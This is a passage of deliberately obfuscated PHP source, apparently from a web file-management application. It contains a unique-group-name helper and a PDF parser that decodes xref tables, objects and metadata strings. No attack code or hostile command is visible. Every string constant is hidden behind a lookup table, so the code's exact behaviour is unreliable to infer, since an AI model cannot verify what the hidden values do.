array_reverse($A—›Ÿê•–‡)) . $D¾šÌÙ±[47]; $this->setNamePinyin($CãÅªàƒ®²[$C·èùö‹×¸], $CãÅªàƒ®²[$D¾šÌÙ±[28]]); goto E‚İ¿œˆë; E£•ÔìæŸ‹: } return $BÅôŒÚ¢‰´; } public function groupNameAuto($BÎ‚ÏŞÆ—ç, $eöã×¹¨ÈÌ) { $AÓ¿¾àï©½ =& $_SERVER[Å¸ş]; $Bö…„¾Áá… = $this->where(array($AÓ¿¾àï©½[368] => $BÎ‚ÏŞÆ—ç))->getField($AÓ¿¾àï©½[28], !0); if (!$Bö…„¾Áá… || !in_array($eöã×¹¨ÈÌ, $Bö…„¾Áá…)) { return $eöã×¹¨ÈÌ; } for ($Cä·°ŠÌ•É = 1; $Cä·°ŠÌ•É <= count($Bö…„¾Áá…) + 1; $Cä·°ŠÌ•É++) { $Dæ±Æ‚İ–ò = $eöã×¹¨ÈÌ . "\x28{$Cä·°ŠÌ•É}\51"; if (!in_array($Dæ±Æ‚İ–ò, $Bö…„¾Áá…)) { return $Dæ±Æ‚İ–ò; } } } } goto C Œ¾ËàœŞ; F…÷Ææ¸‚: class FileParsePdf { public static function parse($B‚¢²Ëí”÷) { goto aï‘±Œ¬¤Í; aï‘±Œ¬¤Í: $AÜƒóÖÇ‚ =& $_SERVER[Å¸ş]; $cÑâ“ãÅÇ× = 32 * 1024; $B¯À¿øâŸ’ = array($AÜƒóÖÇ‚[779] => fopen($B‚¢²Ëí”÷, $AÜƒóÖÇ‚[1168]), $AÜƒóÖÇ‚[75] => $B‚¢²Ëí”÷, $AÜƒóÖÇ‚[77] => filesize($B‚¢²Ëí”÷), $AÜƒóÖÇ‚[1531] => $cÑâ“ãÅÇ×); goto b‘š¸öÏãè; dä–îéÏÕ’: if ($dš‰¦ø·Ğç[1] && $Cä£â­±[$AÜƒóÖÇ‚[1539]] < $dš‰¦ø·Ğç[1][0]) { $Cä£â­±[$AÜƒóÖÇ‚[1539]] = $dš‰¦ø·Ğç[1][0]; } $Cä£â­± = self::parseInfoItem($Cä£â­±); return $Cä£â­±; goto CÓ¦³‘¯©…; B„†º©ì¡: $a÷Œ¨ß…Ê = $AÜƒóÖÇ‚[1536]; preg_match($a÷Œ¨ß…Ê, $B¯À¿øâŸ’[$AÜƒóÖÇ‚[1532]], $dš‰¦ø·Ğç); if (!$Cä£â­±[$AÜƒóÖÇ‚[1535]] && count($dš‰¦ø·Ğç) == 5) { $Cä£â­±[$AÜƒóÖÇ‚[1535]] = $dš‰¦ø·Ğç[3]; $Cä£â­±[$AÜƒóÖÇ‚[1537]] = $dš‰¦ø·Ğç[4]; } goto B§Ç‚´ó¢; B§Ç‚´ó¢: preg_match($a÷Œ¨ß…Ê, $B¯À¿øâŸ’[$AÜƒóÖÇ‚[1533]], $dš‰¦ø·Ğç); if (!$Cä£â­±[$AÜƒóÖÇ‚[1535]] && count($dš‰¦ø·Ğç) == 5) { $Cä£â­±[$AÜƒóÖÇ‚[1535]] = $dš‰¦ø·Ğç[3]; $Cä£â­±[$AÜƒóÖÇ‚[1537]] = $dš‰¦ø·Ğç[4]; } preg_match($AÜƒóÖÇ‚[1538], $B¯À¿øâŸ’[$AÜƒóÖÇ‚[1532]], $dš‰¦ø·Ğç); goto a’ÑŸˆà; f™ã‚ª²µ’: preg_match_all($a÷Œ¨ß…Ê, $B¯À¿øâŸ’[$AÜƒóÖÇ‚[1532]], $dš‰¦ø·Ğç); if ($dš‰¦ø·Ğç[1] && $Cä£â­±[$AÜƒóÖÇ‚[1539]] < $dš‰¦ø·Ğç[1][0]) { $Cä£â­±[$AÜƒóÖÇ‚[1539]] = $dš‰¦ø·Ğç[1][0]; } preg_match_all($a÷Œ¨ß…Ê, $B¯À¿øâŸ’[$AÜƒóÖÇ‚[1533]], $dš‰¦ø·Ğç); goto dä–îéÏÕ’; b‘š¸öÏãè: $B¯À¿øâŸ’[$AÜƒóÖÇ‚[1532]] = StreamWrapperIO::read($B‚¢²Ëí”÷, 0, $cÑâ“ãÅÇ×); $B¯À¿øâŸ’[$AÜƒóÖÇ‚[1533]] = StreamWrapperIO::read($B‚¢²Ëí”÷, $B¯À¿øâŸ’[$AÜƒóÖÇ‚[77]] - $cÑâ“ãÅÇ×, $cÑâ“ãÅÇ×); $D”âôà›·¾ = self::decodeXref($B¯À¿øâŸ’); goto Bèí¤âŒ×; Bèí¤âŒ×: if ($D”âôà›·¾) { $Aø‘¨ÃÃæÎ = $D”âôà›·¾[$AÜƒóÖÇ‚[1534]][$AÜƒóÖÇ‚[1190]]; $Cä£â­± = self::getObjectValue($B¯À¿øâŸ’, $D”âôà›·¾, $Aø‘¨ÃÃæÎ); } $Cä£â­± = is_array($Cä£â­±) ? $Cä£â­± : array(); $Cä£â­±[$AÜƒóÖÇ‚[1535]] = 0; goto B„†º©ì¡; a’ÑŸˆà: if ($dš‰¦ø·Ğç) { $Cä£â­±[$AÜƒóÖÇ‚[1339]] = $dš‰¦ø·Ğç[1]; } $Cä£â­±[$AÜƒóÖÇ‚[1539]] = 0; $a÷Œ¨ß…Ê = $AÜƒóÖÇ‚[1540]; goto f™ã‚ª²µ’; CÓ¦³‘¯©…: } private static function parseInfoItem($d“Ï‡ÑÔë) { $EÙï³éß¬ß =& $_SERVER[Å¸ş]; if (!$d“Ï‡ÑÔë) { return !1; } $DÄÉ¥‚ÖÅÄ = array($EÙï³éß¬ß[1340] => array($EÙï³éß¬ß[1541], $EÙï³éß¬ß[33]), $EÙï³éß¬ß[1542] => array($EÙï³éß¬ß[1543], $EÙï³éß¬ß[33]), $EÙï³éß¬ß[187] => array($EÙï³éß¬ß[1544], $EÙï³éß¬ß[210]), $EÙï³éß¬ß[107] => array($EÙï³éß¬ß[1545], $EÙï³éß¬ß[210]), $EÙï³éß¬ß[1539] => array($EÙï³éß¬ß[1539], $EÙï³éß¬ß[276]), $EÙï³éß¬ß[1535] => array($EÙï³éß¬ß[1535], $EÙï³éß¬ß[276]), $EÙï³éß¬ß[1537] => array($EÙï³éß¬ß[1537], $EÙï³éß¬ß[276]), $EÙï³éß¬ß[1546] => array($EÙï³éß¬ß[1547], $EÙï³éß¬ß[33]), $EÙï³éß¬ß[1548] => array($EÙï³éß¬ß[1549], $EÙï³éß¬ß[33]), $EÙï³éß¬ß[1550] => array($EÙï³éß¬ß[1339], $EÙï³éß¬ß[33])); $eŒÀâå„Ìš = array(); foreach ($DÄÉ¥‚ÖÅÄ as $b•–õ™î³ë => $A÷ñÅçé) { if (!isset($d“Ï‡ÑÔë[$A÷ñÅçé[0]])) { continue; } $dîÂğ²ÕÏ± = $d“Ï‡ÑÔë[$A÷ñÅçé[0]]; if (!$dîÂğ²ÕÏ± || is_array($dîÂğ²ÕÏ±)) { continue; } switch ($A÷ñÅçé[1]) { case $EÙï³éß¬ß[276]: $dîÂğ²ÕÏ± = intval($dîÂğ²ÕÏ±); break; case $EÙï³éß¬ß[210]: if (substr($dîÂğ²ÕÏ±, 0, 2) == $EÙï³éß¬ß[1551]) { $dîÂğ²ÕÏ± = substr($dîÂğ²ÕÏ±, 2, 14); } if (strtotime($dîÂğ²ÕÏ±)) { $dîÂğ²ÕÏ± = date($EÙï³éß¬ß[1552], strtotime($dîÂğ²ÕÏ±)); } break; } $eŒÀâå„Ìš[$b•–õ™î³ë] = $dîÂğ²ÕÏ±; } return $eŒÀâå„Ìš; } private static function decodeXref(&$dÕ÷’ËÆ»„) { goto EÑ™ß¤“à‡; EÙÕƒËò: foreach ($e¹ŒšàÈ×[3] as $fÀ†ºÅâËœ => $f’¸–¼åš) { if ($e¹ŒšàÈ×[3][$fÀ†ºÅâËœ] == $B‚ÆÎÍ¥ˆº[1556]) { $cùŞÌºäë“ = $d‹­¦ã­İ . $B‚ÆÎÍ¥ˆº[70] . intval($e¹ŒšàÈ×[2][$fÀ†ºÅâËœ]); $cÓºËÕå¨[$B‚ÆÎÍ¥ˆº[1553]][$cùŞÌºäë“] = intval($e¹ŒšàÈ×[1][$fÀ†ºÅâËœ]); ++$d‹­¦ã­İ; } else { if ($e¹ŒšàÈ×[3][$fÀ†ºÅâËœ] == $B‚ÆÎÍ¥ˆº[1557]) { ++$d‹­¦ã­İ; } else { } } } if (preg_match_all($B‚ÆÎÍ¥ˆº[1558], $aœ­²¨¤Ê™, $e¹ŒšàÈ×)) { $b‚Şô¹¶Ê´ = $dÕ÷’ËÆ»„[$B‚ÆÎÍ¥ˆº[77]] - $dÕ÷’ËÆ»„[$B‚ÆÎÍ¥ˆº[1531]]; foreach ($e¹ŒšàÈ×[0] as $fÀ†ºÅâËœ => $aÛ‚À‚¬) { $f…Øæìˆâ = $e¹ŒšàÈ×[1][$fÀ†ºÅâËœ] . $B‚ÆÎÍ¥ˆº[70] . $e¹ŒšàÈ×[2][$fÀ†ºÅâËœ]; $cÓºËÕå¨[$B‚ÆÎÍ¥ˆº[1553]][$f…Øæìˆâ] = strpos($aœ­²¨¤Ê™, $aÛ‚À‚¬) + $b‚Şô¹¶Ê´ + 1; } } if (preg_match_all($B‚ÆÎÍ¥ˆº[1559], $aœ­²¨¤Ê™, $e¹ŒšàÈ×)) { $bÎ¬–©‚˜ï = count($e¹ŒšàÈ×[1]) == 1 ? $e¹ŒšàÈ×[1][0] : $e¹ŒšàÈ×[1][1]; } else { $bÎ¬–©‚˜ï = substr($aœ­²¨¤Ê™, -1024 * 5); } goto B£†ß’ëº; EÑ™ß¤“à‡: $B‚ÆÎÍ¥ˆº =& $_SERVER[Å¸ş]; $aœ­²¨¤Ê™ = $dÕ÷’ËÆ»„[$B‚ÆÎÍ¥ˆº[1533]]; $cÓºËÕå¨ = array($B‚ÆÎÍ¥ˆº[1534] => array(), $B‚ÆÎÍ¥ˆº[1553] => array()); goto Fâ•×ô½½Í; b½»ÀÛÌ¿À: if ($dÕ÷’ËÆ»„[$B‚ÆÎÍ¥ˆº[77]] - $F¥™©ÜÙ‘Û > $dÕ÷’ËÆ»„[$B‚ÆÎÍ¥ˆº[1531]]) { $BËÇÍ¥òÌ = 4 * $dÕ÷’ËÆ»„[$B‚ÆÎÍ¥ˆº[1531]]; $dÕ÷’ËÆ»„[$B‚ÆÎÍ¥ˆº[1531]] = $BËÇÍ¥òÌ; $dÕ÷’ËÆ»„[$B‚ÆÎÍ¥ˆº[1532]] = StreamWrapperIO::read($dÕ÷’ËÆ»„[$B‚ÆÎÍ¥ˆº[75]], 0, $BËÇÍ¥òÌ); $dÕ÷’ËÆ»„[$B‚ÆÎÍ¥ˆº[1533]] = StreamWrapperIO::read($dÕ÷’ËÆ»„[$B‚ÆÎÍ¥ˆº[75]], $dÕ÷’ËÆ»„[$B‚ÆÎÍ¥ˆº[77]] - $BËÇÍ¥òÌ, $BËÇÍ¥òÌ); $aœ­²¨¤Ê™ = $dÕ÷’ËÆ»„[$B‚ÆÎÍ¥ˆº[1533]]; } $d‹­¦ã­İ = 0; preg_match_all($B‚ÆÎÍ¥ˆº[1555], $aœ­²¨¤Ê™, $e¹ŒšàÈ×); goto EÙÕƒËò; e£ŠÀÂ•ê´: if (preg_match($B‚ÆÎÍ¥ˆº[1565], $bÎ¬–©‚˜ï, $e¹ŒšàÈ×) > 0) { $cÓºËÕå¨[$B‚ÆÎÍ¥ˆº[1534]][$B‚ÆÎÍ¥ˆº[1190]] = intval($e¹ŒšàÈ×[1]) . $B‚ÆÎÍ¥ˆº[70] . intval($e¹ŒšàÈ×[2]); } if (preg_match($B‚ÆÎÍ¥ˆº[1566], $bÎ¬–©‚˜ï, $e¹ŒšàÈ×) > 0) { $cÓºËÕå¨[$B‚ÆÎÍ¥ˆº[1534]][$B‚ÆÎÍ¥ˆº[367]] = array(); $cÓºËÕå¨[$B‚ÆÎÍ¥ˆº[1534]][$B‚ÆÎÍ¥ˆº[367]][0] = $e¹ŒšàÈ×[1]; $cÓºËÕå¨[$B‚ÆÎÍ¥ˆº[1534]][$B‚ÆÎÍ¥ˆº[367]][1] = $e¹ŒšàÈ×[2]; } if (!$cÓºËÕå¨[$B‚ÆÎÍ¥ˆº[1534]][$B‚ÆÎÍ¥ˆº[1190]]) { return !1; } goto FĞ‰ŸÌ‚Á; Fâ•×ô½½Í: $a†‰Ö˜Ÿçí = $B‚ÆÎÍ¥ˆº[1554]; if (!preg_match_all($a†‰Ö˜Ÿçí, $aœ­²¨¤Ê™, $e¹ŒšàÈ×, PREG_SET_ORDER, 0)) { return !1; } $F¥™©ÜÙ‘Û = intval($e¹ŒšàÈ×[0][1]); goto b½»ÀÛÌ¿À; B£†ß’ëº: if (preg_match($B‚ÆÎÍ¥ˆº[1560], $bÎ¬–©‚˜ï, $e¹ŒšàÈ×) > 0) { $cÓºËÕå¨[$B‚ÆÎÍ¥ˆº[1534]][$B‚ÆÎÍ¥ˆº[77]] = intval($e¹ŒšàÈ×[1]); } if (preg_match($B‚ÆÎÍ¥ˆº[1561], $bÎ¬–©‚˜ï, $e¹ŒšàÈ×) > 0) { $cÓºËÕå¨[$B‚ÆÎÍ¥ˆº[1534]][$B‚ÆÎÍ¥ˆº[1562]] = intval($e¹ŒšàÈ×[1]) . $B‚ÆÎÍ¥ˆº[70] . intval($e¹ŒšàÈ×[2]); } if (preg_match($B‚ÆÎÍ¥ˆº[1563], $bÎ¬–©‚˜ï, $e¹ŒšàÈ×) > 0) { $cÓºËÕå¨[$B‚ÆÎÍ¥ˆº[1534]][$B‚ÆÎÍ¥ˆº[1564]] = intval($e¹ŒšàÈ×[1]) . $B‚ÆÎÍ¥ˆº[70] . intval($e¹ŒšàÈ×[2]); } goto e£ŠÀÂ•ê´; FĞ‰ŸÌ‚Á: if (preg_match($B‚ÆÎÍ¥ˆº[1567], $bÎ¬–©‚˜ï, $e¹ŒšàÈ×) > 0) { } return $cÓºËÕå¨; goto FÍïËâÂã; FÍïËâÂã: } private static function getObjectValue($EÆšíÔÙÇÛ, $fÌñ®Â§È¤, $fÃŒ˜ô™‰©) { goto dï³µ‡„Óİ; fšãÚ†øÀé: return $e˜³á¤Õİ¦; goto eÃÄŠ’øØæ; A»š†±²êñ: if (!is_array($c£Á«â° Ÿ[1])) { return array(); } $e˜³á¤Õİ¦ = array(); for ($C£°æó×æò = 0; $C£°æó×æò < count($c£Á«â° Ÿ[1]); $C£°æó×æò += 2) { $D…ËÏ³ØˆÆ = $c£Á«â° Ÿ[1][$C£°æó×æò]; $D•Ï ®áîÆ = $c£Á«â° Ÿ[1][$C£°æó×æò + 1]; if (count($D…ËÏ³ØˆÆ) == 3 && $D…ËÏ³ØˆÆ[0] == $E“ö§Ø–®Ò[8]) { $f†ÖÜ¼æâ = !1; if ($D•Ï ®áîÆ[0] == $E“ö§Ø–®Ò[1568]) { $D•Ï ®áîÆ = self::getObject($EÆšíÔÙÇÛ, $fÌñ®Â§È¤[$E“ö§Ø–®Ò[1553]][$D•Ï ®áîÆ[1]]); } $f†ÖÜ¼æâ = $D•Ï ®áîÆ[1]; if ($f†ÖÜ¼æâ === !1) { continue; } if (is_string($f†ÖÜ¼æâ)) { $f†ÖÜ¼æâ = self::decodeStr($f†ÖÜ¼æâ); } $e˜³á¤Õİ¦[$D…ËÏ³ØˆÆ[1]] = $f†ÖÜ¼æâ; } } goto fšãÚ†øÀé; dï³µ‡„Óİ: $E“ö§Ø–®Ò =& $_SERVER[Å¸ş]; $c£Á«â° Ÿ = self::getObject($EÆšíÔÙÇÛ, $fÌñ®Â§È¤[$E“ö§Ø–®Ò[1553]][$fÃŒ˜ô™‰©]); if (is_string($c£Á«â° Ÿ[1])) { return $c£Á«â° Ÿ[1]; } goto A»š†±²êñ; eÃÄŠ’øØæ: } private static function getObject($a…¨—Ä’»¾, $e×™Î–ŞÕ) { $f ”Ü’¥Í¼ = self::getObjectItem($a…¨—Ä’»¾, $e×™Î–ŞÕ); $f ”Ü’¥Í¼ = self::getObjectItem($a…¨—Ä’»¾, $f ”Ü’¥Í¼[2]); return $f ”Ü’¥Í¼; } private static function getObjectItem($cÃíŠœ¡ä÷, $fó·À©ë‡Ï) { goto a·¾¥ƒéœ¦; a·¾¥ƒéœ¦: $aİ¾ù¹”Õ· =& $_SERVER[Å¸ş]; $aÖ¼ùïÅÖù = $cÃíŠœ¡ä÷[$aİ¾ù¹”Õ·[1531]]; $aÍç·Ğç»ñ = $cÃíŠœ¡ä÷[$aİ¾ù¹”Õ·[77]] - $aÖ¼ùïÅÖù; goto E‹¾¤ÁªøÎ; E‹¾¤ÁªøÎ: $dòÎæÎÃæ¦ = $fó·À©ë‡Ï >= $aÍç·Ğç»ñ ? $fó·À©ë‡Ï - $aÍç·Ğç»ñ : $fó·À©ë‡Ï; $BìºÜ¯¾‹Í = $fó·À©ë‡Ï >= $aÍç·Ğç»ñ ? $cÃíŠœ¡ä÷[$aİ¾ù¹”Õ·[1533]] : $cÃíŠœ¡ä÷[$aİ¾ù¹”Õ·[1532]]; if ($fó·À©ë‡Ï > $aÖ¼ùïÅÖù && $fó·À©ë‡Ï <= $aÍç·Ğç»ñ) { $dòÎæÎÃæ¦ = 0; $BìºÜ¯¾‹Í = StreamWrapperIO::read($cÃíŠœ¡ä÷[$aİ¾ù¹”Õ·[75]], $fó·À©ë‡Ï, $aÖ¼ùïÅÖù); } goto F‘ ’å³»ö; F‘ ’å³»ö: $e¶Ë‚ß×‹ù = self::getRawObject($BìºÜ¯¾‹Í, $dòÎæÎÃæ¦); if ($fó·À©ë‡Ï >= $aÍç·Ğç»ñ) { $e¶Ë‚ß×‹ù[2] = $e¶Ë‚ß×‹ù[2] + $aÍç·Ğç»ñ; } else { if ($fó·À©ë‡Ï > $aÖ¼ùïÅÖù && $fó·À©ë‡Ï <= $aÍç·Ğç»ñ) { $e¶Ë‚ß×‹ù[2] = $e¶Ë‚ß×‹ù[2] + $fó·À©ë‡Ï; } } return $e¶Ë‚ß×‹ù; goto b™¨—Œõ‘Š; b™¨—Œõ‘Š: } private static function decodeStr($b÷ØŠˆÒƒ) { goto EÀŒê…éğ; D½Úæªæ¼Œ: $b÷ØŠˆÒƒ = $E¢˜µÈÙçÉ[33]; foreach ($Dõâ‰Ô×•ˆ as $C©Ó¾¡¸¿ä) { if (preg_match($E¢˜µÈÙçÉ[1580], $C©Ó¾¡¸¿ä)) { $b÷ØŠˆÒƒ .= \chr(hexdec(trim($C©Ó¾¡¸¿ä, $E¢˜µÈÙçÉ[1581]))); } else { $b÷ØŠˆÒƒ .= $C©Ó¾¡¸¿ä; } } $Dõâ‰Ô×•ˆ = preg_split($E¢˜µÈÙçÉ[1582], $b÷ØŠˆÒƒ, -1, PREG_SPLIT_NO_EMPTY | PREG_SPLIT_DELIM_CAPTURE); goto eáã¾‘ê; a‡„Ï¢…óÑ: return $b÷ØŠˆÒƒ; goto bÒªÂÙŞäé; EÀŒê…éğ: $E¢˜µÈÙçÉ =& $_SERVER[Å¸ş]; $b÷ØŠˆÒƒ = str_replace(array($E¢˜µÈÙçÉ[1569], $E¢˜µÈÙçÉ[1570], $E¢˜µÈÙçÉ[1571], $E¢˜µÈÙçÉ[1572], $E¢˜µÈÙçÉ[1573], $E¢˜µÈÙçÉ[1574], $E¢˜µÈÙçÉ[1575], $E¢˜µÈÙçÉ[1576]), array($E¢˜µÈÙçÉ[93], $E¢˜µÈÙçÉ[50], $E¢˜µÈÙçÉ[8], $E¢˜µÈÙçÉ[248], $E¢˜µÈÙçÉ[814], $E¢˜µÈÙçÉ[217], $E¢˜µÈÙçÉ[990], $E¢˜µÈÙçÉ[330]), $b÷ØŠˆÒƒ); $Dõâ‰Ô×•ˆ = preg_split($E¢˜µÈÙçÉ[1577], $b÷ØŠˆÒƒ, -1, PREG_SPLIT_NO_EMPTY | PREG_SPLIT_DELIM_CAPTURE); goto b£®†æÊ‚; eáã¾‘ê: $b÷ØŠˆÒƒ = $E¢˜µÈÙçÉ[33]; foreach ($Dõâ‰Ô×•ˆ as $C©Ó¾¡¸¿ä) { if (preg_match($E¢˜µÈÙçÉ[1583], $C©Ó¾¡¸¿ä) && !1 === stripos($C©Ó¾¡¸¿ä, $E¢˜µÈÙçÉ[1584])) { $C©Ó¾¡¸¿ä = preg_replace($E¢˜µÈÙçÉ[1585], $E¢˜µÈÙçÉ[33], $C©Ó¾¡¸¿ä); $C©Ó¾¡¸¿ä = trim($C©Ó¾¡¸¿ä, $E¢˜µÈÙçÉ[923]); $C©Ó¾¡¸¿ä = pack($E¢˜µÈÙçÉ[1586], $C©Ó¾¡¸¿ä); $b÷ØŠˆÒƒ .= $C©Ó¾¡¸¿ä; } else { $b÷ØŠˆÒƒ .= $C©Ó¾¡¸¿ä; } } if (preg_match($E¢˜µÈÙçÉ[1587], $b÷ØŠˆÒƒ)) { $BßÜ½–¥³Š = substr($b÷ØŠˆÒƒ, 2); $b÷ØŠˆÒƒ = $E¢˜µÈÙçÉ[33]; $bõßˆôë™â = strlen($BßÜ½–¥³Š); for ($BšøİíÍ±ö = 0; $BšøİíÍ±ö < $bõßˆôë™â; $BšøİíÍ±ö += 2) { $f¸­…¡„ = hexdec(bin2hex(substr($BßÜ½–¥³Š, $BšøİíÍ±ö, 2))); $b÷ØŠˆÒƒ .= mb_convert_encoding($E¢˜µÈÙçÉ[1588] . intval($f¸­…¡„) . $E¢˜µÈÙçÉ[67], $E¢˜µÈÙçÉ[1589], $E¢˜µÈÙçÉ[1590]); } } goto a‡„Ï¢…óÑ; b£®†æÊ‚: $b÷ØŠˆÒƒ = $E¢˜µÈÙçÉ[33]; foreach ($Dõâ‰Ô×•ˆ as $C©Ó¾¡¸¿ä) { if (preg_match($E¢˜µÈÙçÉ[1578], $C©Ó¾¡¸¿ä)) { $b÷ØŠˆÒƒ .= \chr(octdec(trim($C©Ó¾¡¸¿ä, $E¢˜µÈÙçÉ[93]))); } else { $b÷ØŠˆÒƒ .= $C©Ó¾¡¸¿ä; } } $Dõâ‰Ô×•ˆ = preg_split($E¢˜µÈÙçÉ[1579], $b÷ØŠˆÒƒ, -1, PREG_SPLIT_NO_EMPTY | PREG_SPLIT_DELIM_CAPTURE); goto D½Úæªæ¼Œ; bÒªÂÙŞäé: } private static function getRawObject($e©‡Ãğ‰¾“, $F£°×ˆõ™¯ = 0) { goto a­•‡°‡¢; E£¢Å§™Ü: return array($d§Èíƒ¢Ö, $D¼‚èå£³•, $F£°×ˆõ™¯); goto EÌÚ¤¸™áŸ; Eæöù£ôğ•: $F£°×ˆõ™¯ += strspn($e©‡Ãğ‰¾“, $F—ÙäÈ°©Ò[1591], $F£°×ˆõ™¯); $Dê¹Ë“ì° = $e©‡Ãğ‰¾“[$F£°×ˆõ™¯]; switch ($Dê¹Ë“ì°) { case $F—ÙäÈ°©Ò[1592]: $E”ˆïÌ—ø‚ = strcspn($e©‡Ãğ‰¾“, $F—ÙäÈ°©Ò[1593], $F£°×ˆõ™¯); if ($E”ˆïÌ—ø‚ > 0) { $F£°×ˆõ™¯ += $E”ˆïÌ—ø‚; return self::getRawObject($e©‡Ãğ‰¾“, $F£°×ˆõ™¯); } break; case $F—ÙäÈ°©Ò[8]: $d§Èíƒ¢Ö = $Dê¹Ë“ì°; ++$F£°×ˆõ™¯; $dä¢ì²Ú”Ş = preg_match($F—ÙäÈ°©Ò[1594], substr($e©‡Ãğ‰¾“, $F£°×ˆõ™¯, 256), $BğùÜ®ôİ); if (1 == $dä¢ì²Ú”Ş) { $D¼‚èå£³• = $BğùÜ®ôİ[1]; $F£°×ˆõ™¯ += strlen($D¼‚èå£³•); } break; case $F—ÙäÈ°©Ò[248]: case $F—ÙäÈ°©Ò[814]: $d§Èíƒ¢Ö = $Dê¹Ë“ì°; ++$F£°×ˆõ™¯; $CßíË°…·ğ = $F£°×ˆõ™¯; if ($F—ÙäÈ°©Ò[248] == $Dê¹Ë“ì°) { $aÚÕ ‰Û = 1; while ($aÚÕ ‰Û > 0) { if (!isset($e©‡Ãğ‰¾“[$CßíË°…·ğ])) { break; } $F¡›Š¹©ˆ¹ = $e©‡Ãğ‰¾“[$CßíË°…·ğ]; switch ($F¡›Š¹©ˆ¹) { case $F—ÙäÈ°©Ò[93]: ++$CßíË°…·ğ; break; case $F—ÙäÈ°©Ò[248]: ++$aÚÕ ‰Û; break; case $F—ÙäÈ°©Ò[814]: --$aÚÕ ‰Û; break; } ++$CßíË°…·ğ; } $D¼‚èå£³• = substr($e©‡Ãğ‰¾“, $F£°×ˆõ™¯, $CßíË°…·ğ - $F£°×ˆõ™¯ - 1); $F£°×ˆõ™¯ = $CßíË°…·ğ; } break; case $F—ÙäÈ°©Ò[157]: case $F—ÙäÈ°©Ò[478]: $d§Èíƒ¢Ö = $Dê¹Ë“ì°; ++$F£°×ˆõ™¯; if ($F—ÙäÈ°©Ò[157] == $Dê¹Ë“ì°) { $D¼‚èå£³• = array(); do { $C‡™·ÏŒ™— = $F£°×ˆõ™¯; $b®¼ç›Ò— = self::getRawObject($e©‡Ãğ‰¾“, $F£°×ˆõ™¯); $F£°×ˆõ™¯ = $b®¼ç›Ò—[2]; $D¼‚èå£³•[] = $b®¼ç›Ò—; } while ($F—ÙäÈ°©Ò[478] != $b®¼ç›Ò—[0] && $F£°×ˆõ™¯ != $C‡™·ÏŒ™—); array_pop($D¼‚èå£³•); } break; case $F—ÙäÈ°©Ò[922]: case $F—ÙäÈ°©Ò[925]: if (isset($e©‡Ãğ‰¾“[$F£°×ˆõ™¯ + 1]) && $e©‡Ãğ‰¾“[$F£°×ˆõ™¯ + 1] == $Dê¹Ë“ì°) { $d§Èíƒ¢Ö = $Dê¹Ë“ì° . $Dê¹Ë“ì°; $F£°×ˆõ™¯ += 2; if ($F—ÙäÈ°©Ò[922] == $Dê¹Ë“ì°) { $D¼‚èå£³• = array(); do { $C‡™·ÏŒ™— = $F£°×ˆõ™¯; $b®¼ç›Ò— = self::getRawObject($e©‡Ãğ‰¾“, $F£°×ˆõ™¯); $F£°×ˆõ™¯ = $b®¼ç›Ò—[2]; $D¼‚èå£³•[] = $b®¼ç›Ò—; } while ($F—ÙäÈ°©Ò[1595] != $b®¼ç›Ò—[0] && $F£°×ˆõ™¯ != $C‡™·ÏŒ™—); array_pop($D¼‚èå£³•); } } else { $d§Èíƒ¢Ö = $Dê¹Ë“ì°; ++$F£°×ˆõ™¯; $dä¢ì²Ú”Ş = preg_match($F—ÙäÈ°©Ò[1596], substr($e©‡Ãğ‰¾“, $F£°×ˆõ™¯), $BğùÜ®ôİ); if ($F—ÙäÈ°©Ò[922] == $Dê¹Ë“ì° && 1 == $dä¢ì²Ú”Ş) { $D¼‚èå£³• = strtr($BğùÜ®ôİ[1], $F—ÙäÈ°©Ò[1597], $F—ÙäÈ°©Ò[33]); $F£°×ˆõ™¯ += \strlen($BğùÜ®ôİ[0]); } elseif (!1 !== ($CÑö‰×îÜ = strpos($e©‡Ãğ‰¾“, $F—ÙäÈ°©Ò[925], $F£°×ˆõ™¯))) { $F£°×ˆõ™¯ = $CÑö‰×îÜ + 1; } } break; default: if ($F—ÙäÈ°©Ò[1598] == substr($e©‡Ãğ‰¾“, $F£°×ˆõ™¯, 6)) { $d§Èíƒ¢Ö = $F—ÙäÈ°©Ò[1598]; $F£°×ˆõ™¯ += 6; } elseif ($F—ÙäÈ°©Ò[99] == substr($e©‡Ãğ‰¾“, $F£°×ˆõ™¯, 4)) { $d§Èíƒ¢Ö = $F—ÙäÈ°©Ò[99]; $F£°×ˆõ™¯ += 4; $D¼‚èå£³• = $F—ÙäÈ°©Ò[99]; } elseif ($F—ÙäÈ°©Ò[1599] == substr($e©‡Ãğ‰¾“, $F£°×ˆõ™¯, 4)) { $d§Èíƒ¢Ö = $F—ÙäÈ°©Ò[1600]; $F£°×ˆõ™¯ += 4; $D¼‚èå£³• = $F—ÙäÈ°©Ò[1599]; } elseif ($F—ÙäÈ°©Ò[1601] == substr($e©‡Ãğ‰¾“, $F£°×ˆõ™¯, 5)) { $d§Èíƒ¢Ö = $F—ÙäÈ°©Ò[1600]; $F£°×ˆõ™¯ += 5; $D¼‚èå£³• = $F—ÙäÈ°©Ò[1601]; } elseif ($F—ÙäÈ°©Ò[1602] == substr($e©‡Ãğ‰¾“, $F£°×ˆõ™¯, 6)) { $d§Èíƒ¢Ö = $F—ÙäÈ°©Ò[1602]; $F£°×ˆõ™¯ += 6; if (1 == preg_match($F—ÙäÈ°©Ò[1603], substr($e©‡Ãğ‰¾“, $F£°×ˆõ™¯), $BğùÜ®ôİ)) { $F£°×ˆõ™¯ += strlen($BğùÜ®ôİ[0]); $EŠô„ê¥¥ = $F—ÙäÈ°©Ò[1604]; $dä¢ì²Ú”Ş = preg_match($EŠô„ê¥¥, substr($e©‡Ãğ‰¾“, $F£°×ˆõ™¯), $BğùÜ®ôİ, PREG_OFFSET_CAPTURE); if (1 == $dä¢ì²Ú”Ş) { $D¼‚èå£³• = substr($e©‡Ãğ‰¾“, $F£°×ˆõ™¯, $BğùÜ®ôİ[0][1]); $F£°×ˆõ™¯ += $BğùÜ®ôİ[1][1]; } } } elseif ($F—ÙäÈ°©Ò[1605] == substr($e©‡Ãğ‰¾“, $F£°×ˆõ™¯, 9)) { $d§Èíƒ¢Ö = $F—ÙäÈ°©Ò[1605]; $F£°×ˆõ™¯ += 9; } elseif (1 == preg_match($F—ÙäÈ°©Ò[1606], substr($e©‡Ãğ‰¾“, $F£°×ˆõ™¯, 33), $BğùÜ®ôİ)) { $d§Èíƒ¢Ö = $F—ÙäÈ°©Ò[1568]; $F£°×ˆõ™¯ += strlen($BğùÜ®ôİ[0]); $D¼‚èå£³• = intval($BğùÜ®ôİ[1]) . $F—ÙäÈ°©Ò[70] . intval($BğùÜ®ôİ[2]); } elseif (1 == preg_match($F—ÙäÈ°©Ò[1607], substr($e©‡Ãğ‰¾“, 